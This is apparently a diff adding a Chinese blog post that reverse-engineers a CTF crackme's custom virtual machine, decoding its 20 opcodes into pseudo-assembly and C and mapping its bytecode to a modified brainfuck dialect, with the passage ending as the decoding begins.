+    state = InstrState(<span class="hljs-string">&#x27;L%02d&#x27;</span> % i)
+    <span class="hljs-keyword">for</span> op <span class="hljs-keyword">in</span> ops[:-<span class="hljs-number">1</span>]:
+        state.push(op)
+    arr[i] = state.get()
+
+<span class="hljs-comment">#import json</span>
+<span class="hljs-comment">#arr = dict((&#x27;op_%02d&#x27; % i, c) for i, c in enumerate(arr))</span>
+<span class="hljs-comment">#json.dump(arr, open(&#x27;dump.json&#x27;, &#x27;w&#x27;), indent=2)</span>
+<span class="hljs-comment">#exit()</span>
+
+dummy = <span class="hljs-string">&#x27;&#x27;</span>
+<span class="hljs-keyword">for</span> i, code <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(arr):
+    dummy += <span class="hljs-string">&#x27;&#x27;&#x27;\
+static void op_%02d(struct vm *vm, uint16_t opr1, uint16_t opr2) __attribute__((naked));
+void op_%02d(struct vm *vm, uint16_t opr1, uint16_t opr2) {
+    __asm__(
+%s
+    );
+}
+
+&#x27;&#x27;&#x27;</span> % (i, i, <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-string">&#x27;        &quot;%s\\n&quot;\n&#x27;</span> % c <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> code))
+
+dummy = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;template.c&#x27;</span>).read().replace(<span class="hljs-string">&#x27;// dummy&#x27;</span>, dummy)
+<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;dummy.c&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>).write(dummy)
+<span class="hljs-keyword">assert</span> os.system(<span class="hljs-string">&#x27;gcc -g -o dummy dummy.c&#x27;</span>) == <span class="hljs-number">0</span>
+os.unlink(<span class="hljs-string">&#x27;dummy.c&#x27;</span>)</code></pre><p>dummy.c：</p>
+<pre class="hljs"><code><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdint.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span>
+
+<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">instruct</span> {</span>
+    <span class="hljs-keyword">uint16_t</span> op, opr1, opr2;
+};
+
+<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm</span> {</span>
+        <span class="hljs-keyword">uint16_t</span> reg[<span class="hljs-number">0x10000</span>];
+        <span class="hljs-keyword">uint16_t</span> pc;
+    <span class="hljs-class"><span class="hljs-keyword">struct</span> {</span>
+        <span class="hljs-keyword">uint16_t</span> LF: <span class="hljs-number">1</span>;  <span class="hljs-comment">// SF ^ OF</span>
+        <span class="hljs-keyword">uint16_t</span> ZF: <span class="hljs-number">1</span>;  <span class="hljs-comment">// ZF</span>
+        <span class="hljs-keyword">uint16_t</span> GF: <span class="hljs-number">1</span>;  <span class="hljs-comment">// !(SF ^ OF | ZF)</span>
+        <span class="hljs-keyword">uint16_t</span> FF: <span class="hljs-number">1</span>;  <span class="hljs-comment">// set IF function fails</span>
+    } flags;
+        <span class="hljs-keyword">void</span> *ptrs[<span class="hljs-number">0x10000</span>];
+        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">instruct</span> <span class="hljs-title">prog</span>[0<span class="hljs-title">x10000</span>];</span>
+        <span class="hljs-keyword">uint16_t</span> mem[<span class="hljs-number">0x10000</span>];
+};
+
+<span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">void</span> <span class="hljs-params">(*vm_func)</span><span class="hljs-params">(struct vm *, <span class="hljs-keyword">uint16_t</span>, <span class="hljs-keyword">uint16_t</span>)</span></span>;
+<span class="hljs-keyword">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm</span> *<span class="hljs-title">vm</span>;</span>
+<span class="hljs-keyword">static</span> <span class="hljs-keyword">uint16_t</span> opr1 = <span class="hljs-number">0</span>;
+
+<span class="hljs-comment">// dummy</span>
+
+<span class="hljs-keyword">static</span> vm_func funcs[] = {op_00, op_01, op_02, op_03, op_04, op_05, op_06, op_07, op_08, op_09, op_10, op_11, op_12, op_13, op_14, op_15, op_16, op_17, op_18, op_19};
+
+<span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">instruct</span> <span class="hljs-title">prog</span>[] =</span> {
+    <span class="hljs-comment">// from file prog</span>
+};
+
+<span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> <span class="hljs-keyword">uint16_t</span> mem[] = {
+    <span class="hljs-comment">// from file mem</span>
+};
+
+<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{
+    vm = (struct vm *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span> (struct vm));
+    <span class="hljs-keyword">if</span> (vm) {
+        <span class="hljs-built_in">memcpy</span>(vm-&gt;prog, prog, <span class="hljs-keyword">sizeof</span> (prog));
+        <span class="hljs-built_in">memcpy</span>(vm-&gt;mem, mem, <span class="hljs-keyword">sizeof</span> (mem));
+        vm-&gt;pc = <span class="hljs-number">0</span>;
+        vm-&gt;ptrs[<span class="hljs-number">0</span>] = <span class="hljs-built_in">stdin</span>;
+        vm-&gt;ptrs[<span class="hljs-number">1</span>] = <span class="hljs-built_in">stdout</span>;
+        vm-&gt;ptrs[<span class="hljs-number">2</span>] = <span class="hljs-built_in">stderr</span>;
+        <span class="hljs-keyword">for</span> (;; ++vm-&gt;pc) {
+            <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">instruct</span> *<span class="hljs-title">instr</span> =</span> &amp;vm-&gt;prog[vm-&gt;pc];
+            <span class="hljs-keyword">if</span> (instr-&gt;op &lt; <span class="hljs-number">20</span>) {
+                opr1 = instr-&gt;opr1;
+                funcs[instr-&gt;op](vm, instr-&gt;opr1, instr-&gt;opr2);
+            }
+        }
+        <span class="hljs-built_in">free</span>(vm);
+    }
+    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+}</code></pre><p>用IDA打开新生成的dummy文件，就知道20条指令分别做了什么了：</p>
+<p class="img-container"><img src="https://i.imgur.com/Ktb8Dsd.png" alt=""></p>
+<p>但实际上这个文件并不能被成功执行，经过与原程序的对比调试发现是<code>op_16</code>不一致，但无妨继续分析代码。指令的格式是<code>op x, y</code>，二十条指令分别是：</p>
+<pre class="hljs"><code><span class="hljs-symbol">00 </span>add rx, ry
+<span class="hljs-symbol">01 </span>sub rx, ry
+<span class="hljs-symbol">02 </span>mul rx, ry
+<span class="hljs-symbol">03 </span>div rx, ry
+<span class="hljs-symbol">04 </span><span class="hljs-keyword">mod</span> rx, ry
+<span class="hljs-symbol">05 </span>mov rx, y
+<span class="hljs-symbol">06 </span>ptrs[rx] = tmpfile()
+<span class="hljs-symbol">07 </span>fclose(ptrs[rx])
+<span class="hljs-symbol">08 </span>rx = getc(ptrs[ry]), set FF
+<span class="hljs-symbol">09 </span>ungetc(rx, ptrs[ry])
+<span class="hljs-symbol">10 </span>putc(rx, ptrs[ry])
+<span class="hljs-symbol">11 </span>exit(rx)
+<span class="hljs-symbol">12 </span>cmp rx, ry
+<span class="hljs-symbol">13 </span>jmp $+x
+<span class="hljs-symbol">14 </span>jb $+x
+<span class="hljs-symbol">15 </span>jz $+x
+<span class="hljs-symbol">16 </span>ja $+x
+<span class="hljs-symbol">17 </span>jf $+x ; jump <span class="hljs-keyword">if</span> previous getc fails.
+<span class="hljs-symbol">18 </span>mov [r1], r2
+<span class="hljs-symbol">19 </span>mov r1, [r2]</code></pre><p>解析并整理，代码如下（<code>ja</code>指令实际上应该是<code>je</code>指令）：</p>
+<pre class="hljs"><code>printf(<span class="hljs-string">&quot;Initializing Interpreter...\n&quot;</span>)<span class="hljs-comment">;</span>
+printf(<span class="hljs-string">&quot;read(0, buf, 50);\n&quot;</span>)<span class="hljs-comment">;</span>
+printf(<span class="hljs-string">&quot;Flag?\n&quot;</span>)<span class="hljs-comment">;</span>
+f0 = tmpfile()
+f1 = tmpfile()
+f2 = tmpfile()
+f3 = tmpfile()
+
+<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r4</span>, <span class="hljs-number">0</span>
+<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r7</span>, <span class="hljs-number">1</span>
+<span class="hljs-symbol">L117:</span>
+<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r5</span>, [<span class="hljs-built_in">r4</span>]
+<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r6</span>, <span class="hljs-number">0</span>
+<span class="hljs-keyword">cmp</span> <span class="hljs-built_in">r5</span>, <span class="hljs-built_in">r6</span>
+<span class="hljs-keyword">ja</span> L124
+ungetc(<span class="hljs-built_in">r5</span>, f1)
+<span class="hljs-keyword">add</span> <span class="hljs-built_in">r4</span>, <span class="hljs-built_in">r7</span>
+<span class="hljs-keyword">jmp</span> L117
+<span class="hljs-symbol">L124:</span>
+
+<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r4</span>, <span class="hljs-number">0</span>
+ungetc(<span class="hljs-built_in">r4</span>, f3)
+<span class="hljs-symbol">L126:</span>
+op20 <span class="hljs-number">15</span>, <span class="hljs-number">0</span>
+<span class="hljs-built_in">r4</span> = getc(f1)
+ungetc(<span class="hljs-built_in">r4</span>, f1)
+jf L250
+<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r5</span>, <span class="hljs-number">127</span>
+<span class="hljs-keyword">cmp</span> <span class="hljs-built_in">r4</span>, <span class="hljs-built_in">r5</span>
+<span class="hljs-keyword">ja</span> L157
+<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r5</span>, <span class="hljs-number">159</span>
+<span class="hljs-keyword">cmp</span> <span class="hljs-built_in">r4</span>, <span class="hljs-built_in">r5</span>
+<span class="hljs-keyword">ja</span> L163
+<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r5</span>, <span class="hljs-number">218</span>
+<span class="hljs-keyword">cmp</span> <span class="hljs-built_in">r4</span>, <span class="hljs-built_in">r5</span>
+<span class="hljs-keyword">ja</span> L238
+<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r5</span>, <span class="hljs-number">37</span>
+<span class="hljs-keyword">cmp</span> <span class="hljs-built_in">r4</span>, <span class="hljs-built_in">r5</span>
+<span class="hljs-keyword">ja</span> L189
+<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r5</span>, <span class="hljs-number">9</span>
+<span class="hljs-keyword">cmp</span> <span class="hljs-built_in">r4</span>, <span class="hljs-built_in">r5</span>
+<span class="hljs-keyword">ja</span> L194
+<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r5</span>, <span class="hljs-number">101</span>
+<span class="hljs-keyword">cmp</span> <span class="hljs-built_in">r4</span>, <span class="hljs-built_in">r5</span>
+<span class="hljs-keyword">ja</span> L205
+<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r5</span>, <span class="hljs-number">74</span>
+<span class="hljs-keyword">cmp</span> <span class="hljs-built_in">r4</span>, <span class="hljs-built_in">r5</span>
+<span class="hljs-keyword">ja</span> L212
+<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r5</span>, <span class="hljs-number">66</span>
+<span class="hljs-keyword">cmp</span> <span class="hljs-built_in">r4</span>, <span class="hljs-built_in">r5</span>
+<span class="hljs-keyword">ja</span> L245
+<span class="hljs-symbol">L154:</span>
+<span class="hljs-built_in">r4</span> = getc(f1)
+ungetc(<span class="hljs-built_in">r4</span>, f0)
+<span class="hljs-keyword">jmp</span> L126
+<span class="hljs-symbol">
+L157:</span>
+<span class="hljs-built_in">r5</span> = getc(f3)
+jf L161
+<span class="hljs-symbol">L159:</span>
+ungetc(<span class="hljs-built_in">r5</span>, f2)
+<span class="hljs-keyword">jmp</span> L154
+<span class="hljs-symbol">L161:</span>
+<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r5</span>, <span class="hljs-number">0</span>
+<span class="hljs-keyword">jmp</span> L159
+<span class="hljs-symbol">L163:</span>
+<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r6</span>, <span class="hljs-number">0</span>
+<span class="hljs-built_in">r5</span> = getc(f3)
+ungetc(<span class="hljs-built_in">r5</span>, f3)
+<span class="hljs-keyword">cmp</span> <span class="hljs-built_in">r5</span>, <span class="hljs-built_in">r6</span>
+<span class="hljs-keyword">ja</span> L169
+<span class="hljs-keyword">jmp</span> L154
+<span class="hljs-symbol">
+L169:</span>
+<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r6</span>, <span class="hljs-number">0</span>
+<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r8</span>, <span class="hljs-number">1</span>
+<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r9</span>, <span class="hljs-number">0</span>
+<span class="hljs-symbol">L172:</span>
+<span class="hljs-built_in">r5</span> = getc(f1)
+ungetc(<span class="hljs-built_in">r5</span>, f1)
+<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r7</span>, <span class="hljs-number">159</span>
+<span class="hljs-keyword">cmp</span> <span class="hljs-built_in">r5</span>, <span class="hljs-built_in">r7</span>
+<span class="hljs-keyword">ja</span> L185
+<span class="hljs-symbol">L177:</span>
+<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r7</span>, <span class="hljs-number">74</span>
+<span class="hljs-keyword">cmp</span> <span class="hljs-built_in">r5</span>, <span class="hljs-built_in">r7</span>
+<span class="hljs-keyword">ja</span> L187
+<span class="hljs-symbol">L180:</span>
+<span class="hljs-keyword">cmp</span> <span class="hljs-built_in">r6</span>, <span class="hljs-built_in">r9</span>
+<span class="hljs-keyword">ja</span> L154
+<span class="hljs-built_in">r5</span> = getc(f1)
+ungetc(<span class="hljs-built_in">r5</span>, f0)
+<span class="hljs-keyword">jmp</span> L172
+<span class="hljs-symbol">L185:</span>
+<span class="hljs-keyword">add</span> <span class="hljs-built_in">r6</span>, <span class="hljs-built_in">r8</span>
+<span class="hljs-keyword">jmp</span> L177
+<span class="hljs-symbol">L187:</span>
+<span class="hljs-keyword">sub</span> <span class="hljs-built_in">r6</span>, <span class="hljs-built_in">r8</span>
+<span class="hljs-keyword">jmp</span> L180
+<span class="hljs-symbol">L189:</span>
+<span class="hljs-built_in">r5</span> = getc(f3)
+<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r6</span>, <span class="hljs-number">1</span>
+putc(<span class="hljs-built_in">r5</span>, stdout)
+ungetc(<span class="hljs-built_in">r5</span>, f3)
+<span class="hljs-keyword">jmp</span> L154
+<span class="hljs-symbol">
+L194:</span>
+<span class="hljs-built_in">r5</span> = getc(f2)
+jf L201
+<span class="hljs-symbol">L196:</span>
+ungetc(<span class="hljs-built_in">r5</span>, f3)
+<span class="hljs-built_in">r5</span> = getc(f2)
+jf L203
+<span class="hljs-symbol">L199:</span>
+ungetc(<span class="hljs-built_in">r5</span>, f3)
+<span class="hljs-keyword">jmp</span> L154
+<span class="hljs-symbol">
+L201:</span>
+<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r5</span>, <span class="hljs-number">0</span>
+<span class="hljs-keyword">jmp</span> L196
+<span class="hljs-symbol">L203:</span>
+<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r5</span>, <span class="hljs-number">0</span>
+<span class="hljs-keyword">jmp</span> L199
+<span class="hljs-symbol">
+L205:</span>
+<span class="hljs-built_in">r5</span> = getc(f3)
+<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r6</span>, <span class="hljs-number">2</span>
+<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r7</span>, <span class="hljs-number">256</span>
+<span class="hljs-keyword">add</span> <span class="hljs-built_in">r5</span>, <span class="hljs-built_in">r6</span>
+<span class="hljs-keyword">div</span> <span class="hljs-built_in">r5</span>, <span class="hljs-built_in">r7</span>
+ungetc(<span class="hljs-built_in">r5</span>, f3)
+<span class="hljs-keyword">jmp</span> L154
+<span class="hljs-symbol">
+L212:</span>
+<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r6</span>, <span class="hljs-number">0</span>
+<span class="hljs-built_in">r5</span> = getc(f3)
+ungetc(<span class="hljs-built_in">r5</span>, f3)
+<span class="hljs-keyword">cmp</span> <span class="hljs-built_in">r5</span>, <span class="hljs-built_in">r6</span>
+<span class="hljs-keyword">jz</span> L218
+<span class="hljs-keyword">jmp</span> L154
+<span class="hljs-symbol">
+L218:</span>
+<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r6</span>, <span class="hljs-number">0</span>
+<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r8</span>, <span class="hljs-number">1</span>
+<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r9</span>, <span class="hljs-number">0</span>
+<span class="hljs-symbol">L221:</span>
+<span class="hljs-built_in">r5</span> = getc(f1)
+ungetc(<span class="hljs-built_in">r5</span>, f1)
+<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r7</span>, <span class="hljs-number">159</span>
+<span class="hljs-keyword">cmp</span> <span class="hljs-built_in">r5</span>, <span class="hljs-built_in">r7</span>
+<span class="hljs-keyword">ja</span> L234
+<span class="hljs-symbol">L226:</span>
+<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r7</span>, <span class="hljs-number">74</span>
+<span class="hljs-keyword">cmp</span> <span class="hljs-built_in">r5</span>, <span class="hljs-built_in">r7</span>
+<span class="hljs-keyword">ja</span> L236
+<span class="hljs-symbol">L229:</span>
+<span class="hljs-keyword">cmp</span> <span class="hljs-built_in">r6</span>, <span class="hljs-built_in">r9</span>
+<span class="hljs-keyword">ja</span> L154
+<span class="hljs-built_in">r5</span> = getc(f0)
+ungetc(<span class="hljs-built_in">r5</span>, f1)
+<span class="hljs-keyword">jmp</span> L221
+<span class="hljs-symbol">
+L234:</span>
+<span class="hljs-keyword">add</span> <span class="hljs-built_in">r6</span>, <span class="hljs-built_in">r8</span>
+<span class="hljs-keyword">jmp</span> L226
+<span class="hljs-symbol">L236:</span>
+<span class="hljs-keyword">sub</span> <span class="hljs-built_in">r6</span>, <span class="hljs-built_in">r8</span>
+<span class="hljs-keyword">jmp</span> L229
+<span class="hljs-symbol">
+L238:</span>
+<span class="hljs-built_in">r5</span> = getc(f3)
+<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r6</span>, <span class="hljs-number">1</span>
+<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r7</span>, <span class="hljs-number">256</span>
+<span class="hljs-keyword">sub</span> <span class="hljs-built_in">r5</span>, <span class="hljs-built_in">r6</span>
+<span class="hljs-keyword">div</span> <span class="hljs-built_in">r5</span>, <span class="hljs-built_in">r7</span>
+ungetc(<span class="hljs-built_in">r5</span>, f3)
+<span class="hljs-keyword">jmp</span> L154
+<span class="hljs-symbol">
+L245:</span>
+<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r5</span>, <span class="hljs-number">0</span>
+<span class="hljs-built_in">r6</span> = getc(stdin)
+<span class="hljs-built_in">r5</span> = getc(f3)
+ungetc(<span class="hljs-built_in">r6</span>, f3)
+<span class="hljs-keyword">jmp</span> L154
+<span class="hljs-symbol">L250:</span>
+<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r0</span>, <span class="hljs-number">0</span>
+halt</code></pre><p>手动翻译X_X：</p>
+<pre class="hljs"><code><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdint.h&gt;</span></span>
+
+<span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> <span class="hljs-keyword">uint16_t</span> mem[] = {
+    <span class="hljs-comment">// from file mem</span>
+};
+
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span>
+
+<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> cmp(x, y) ((x) == (y))</span>
+
+<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>{
+    FILE *f0, *f1, *f2, *f3;
+    <span class="hljs-keyword">uint16_t</span> r4, r5, r6, r7;
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Initializing Interpreter...\n&quot;</span>);
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;read(0, buf, 50);\n&quot;</span>);
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Flag?\n&quot;</span>);
+    f0 = tmpfile();
+    f1 = tmpfile();
+    f2 = tmpfile();
+    f3 = tmpfile();
+    <span class="hljs-keyword">for</span> (r4 = <span class="hljs-number">0</span>; ; ++r4) {
+        r5 = mem[r4];
+        <span class="hljs-keyword">if</span> (cmp(r5, <span class="hljs-number">0</span>)) <span class="hljs-keyword">break</span>;
+        ungetc(r5, f1);
+        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;&gt;%d\n&quot;</span>, r5);
+    }
+    ungetc(<span class="hljs-number">0</span>, f3);
+    L126:
+    r4 = getc(f1);
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;&lt;%d\n&quot;</span>, r4);
+    <span class="hljs-keyword">if</span> (r4 == <span class="hljs-number">0xFFFF</span>) {
+        <span class="hljs-comment">// 成功分支</span>
+        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);
+    }
+    ungetc(r4, f1);
+    <span class="hljs-keyword">if</span> (!cmp(r4, <span class="hljs-number">127</span>)) {
+        <span class="hljs-keyword">if</span> (!cmp(r4, <span class="hljs-number">159</span>)) {
+            <span class="hljs-keyword">if</span> (!cmp(r4, <span class="hljs-number">218</span>)) {
+                <span class="hljs-keyword">if</span> (!cmp(r4, <span class="hljs-number">37</span>)) {
+                    <span class="hljs-keyword">if</span> (!cmp(r4, <span class="hljs-number">9</span>)) {
+                        <span class="hljs-keyword">if</span> (!cmp(r4, <span class="hljs-number">101</span>)) {
+                            <span class="hljs-keyword">if</span> (!cmp(r4, <span class="hljs-number">74</span>)) {
+                                <span class="hljs-keyword">if</span> (!cmp(r4, <span class="hljs-number">66</span>)) {
+                                    L154:
+                                    r4 = getc(f1);
+                                    ungetc(r4, f0);
+                                    <span class="hljs-keyword">goto</span> L126;
+                                } <span class="hljs-keyword">else</span>{
+                                    <span class="hljs-comment">// L245</span>
+                                    r6 = getc(<span class="hljs-built_in">stdin</span>);
+                                    r5 = getc(f3);
+                                    ungetc(r6, f3);
+                                    <span class="hljs-keyword">goto</span> L154;
+                                }
+                            } <span class="hljs-keyword">else</span> {
+                                <span class="hljs-comment">// L212</span>
+                                r5 = getc(f3);
+                                ungetc(r5, f3);
+                                <span class="hljs-keyword">if</span> (r5 == <span class="hljs-number">0</span>) {
+                                    <span class="hljs-comment">// L218</span>
+                                    r6 = <span class="hljs-number">0</span>;
+                                    L221:
+                                    r5 = getc(f1);
+                                    ungetc(r5, f1);
+                                    <span class="hljs-keyword">if</span> (cmp(r5, <span class="hljs-number">159</span>)) {
+                                        <span class="hljs-comment">// L234</span>
+                                        r6 += <span class="hljs-number">1</span>;
+                                    }
+                                    <span class="hljs-comment">// L226</span>
+                                    <span class="hljs-keyword">if</span> (cmp(r7, <span class="hljs-number">74</span>)) {
+                                        <span class="hljs-comment">// L236</span>
+                                        r6 -= <span class="hljs-number">1</span>;
+                                    }
+                                    <span class="hljs-comment">// L229</span>
+                                    <span class="hljs-keyword">if</span> (cmp(r6, <span class="hljs-number">0</span>)) {
+                                        <span class="hljs-keyword">goto</span> L154;
+                                    }
+                                    r5 = getc(f0);
+                                    ungetc(r5, f1);
+                                    <span class="hljs-keyword">goto</span> L221;
+                                }
+                                <span class="hljs-keyword">goto</span> L154;
+                            }
+                        } <span class="hljs-keyword">else</span> {
+                            <span class="hljs-comment">// L205</span>
+                            r5 = getc(f3);
+                            r6 = <span class="hljs-number">2</span>;
+                            r5 += r6;
+                            r5 /= <span class="hljs-number">256</span>;
+                            ungetc(r5, f3);
+                            <span class="hljs-keyword">goto</span> L154;
+                        }
+                    } <span class="hljs-keyword">else</span>{
+                        <span class="hljs-comment">// L194</span>
+                        r5 = getc(f2);
+                        <span class="hljs-keyword">if</span> (r5 == <span class="hljs-number">0xFFFF</span>) {
+                            r5 = <span class="hljs-number">0</span>;
+                        }
+                        <span class="hljs-comment">// L196</span>
+                        ungetc(r5, f3);
+                        r5 = getc(f2);
+                        <span class="hljs-keyword">if</span> (r5 == <span class="hljs-number">0xFFFF</span>) {
+                            <span class="hljs-comment">// L203</span>
+                            r5 = <span class="hljs-number">0</span>;
+                        }
+                        <span class="hljs-comment">// L199</span>
+                        ungetc(r5, f3);
+                        <span class="hljs-keyword">goto</span> L154;
+                    }
+                } <span class="hljs-keyword">else</span> {
+                    <span class="hljs-comment">// L189</span>
+                    r5 = getc(f3);
+                    putc(r5, <span class="hljs-built_in">stdout</span>);
+                    ungetc(r5, f3);
+                    <span class="hljs-keyword">goto</span> L154;
+                }
+            } <span class="hljs-keyword">else</span> {
+                <span class="hljs-comment">// L238</span>
+                r5 = getc(f3);
+                r5 -= <span class="hljs-number">1</span>;
+                r5 /= <span class="hljs-number">256</span>;
+                ungetc(r5, f3);
+                <span class="hljs-keyword">goto</span> L154;
+            }
+        } <span class="hljs-keyword">else</span> {
+            <span class="hljs-comment">// L163</span>
+            r5 = getc(f3);
+            ungetc(r5, f3);
+            <span class="hljs-keyword">if</span> (!cmp(r5, <span class="hljs-number">0</span>)) {
+                <span class="hljs-keyword">goto</span> L154;
+            }
+            <span class="hljs-comment">// L169</span>
+            r6 = <span class="hljs-number">0</span>;
+            L172:
+            r5 = getc(f1);
+            ungetc(r5, f1);
+            <span class="hljs-keyword">if</span> (cmp(r5, <span class="hljs-number">159</span>)) {
+                <span class="hljs-comment">// L185</span>
+                r6 += <span class="hljs-number">1</span>;
+            }
+            <span class="hljs-comment">// L177</span>
+            <span class="hljs-keyword">if</span> (cmp(r5, <span class="hljs-number">74</span>)) {
+                <span class="hljs-comment">// L187</span>
+                r6 -= <span class="hljs-number">1</span>;
+            }
+            <span class="hljs-comment">// L180</span>
+            <span class="hljs-keyword">if</span> (cmp(r6, <span class="hljs-number">0</span>)) {
+                <span class="hljs-keyword">goto</span> L154;
+            }
+            r5 = getc(f1);
+            ungetc(r5, f0);
+            <span class="hljs-keyword">goto</span> L172;
+        }
+    } <span class="hljs-keyword">else</span> {
+        <span class="hljs-comment">// L157</span>
+        r5 = getc(f3);
+        <span class="hljs-keyword">if</span> (r5 == <span class="hljs-number">0xFFFF</span>) {
+            r5 = <span class="hljs-number">0</span>;
+        }
+        <span class="hljs-comment">// L159</span>
+        ungetc(r5, f2);
+        <span class="hljs-keyword">goto</span> L154;
+    }
+    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+}</code></pre><p>它也不能被执行，但是经过一段时间的观察，可以看出这是另一个brainfuck虚拟机，<code>mem</code>中的八种数字分别对应八条指令，但其中<code>+</code>指令实际执行了两次加法，<code>&gt;</code>指令向右移动了两次指针，如果把<code>mem</code>解析成标准brainfuck，则对应表如下（注释是符号在文件中出现的次数）：</p>
+<pre class="hljs"><code>imap = {
+    <span class="hljs-number">74</span>:  &#x27;]&#x27;, <span class="hljs-meta"># 207</span>
+    <span class="hljs-number">218</span>: &#x27;-&#x27;, <span class="hljs-meta"># 8528</span>
+    <span class="hljs-number">159</span>: &#x27;[&#x27;, <span class="hljs-meta"># 207</span>
+    <span class="hljs-number">37</span>:  &#x27;.&#x27;, <span class="hljs-meta"># 18</span>
+    <span class="hljs-number">101</span>: &#x27;++&#x27;, <span class="hljs-meta"># 1314</span>
+    <span class="hljs-number">9</span>:   &#x27;&gt;&gt;&#x27;, <span class="hljs-meta"># 412</span>
+    <span class="hljs-number">127</span>: &#x27;&lt;&#x27;, <span class="hljs-meta"># 759</span>
+    <span class="hljs-number">66</span>:  &#x27;,&#x27;, <span class="hljs-meta"># 1</span>
+}</code></pre><p>值得注意的是，<code>mem</code>中存放的brainfuck指令流在解析时应该倒过来看，因为程序是用<code>ungetc</code>把指令逐个<code>push</code>到文件<code>f1</code>里去的。解析完如下（数据太多了，50个<code>+</code>用<code>+50</code>表示）：</p>
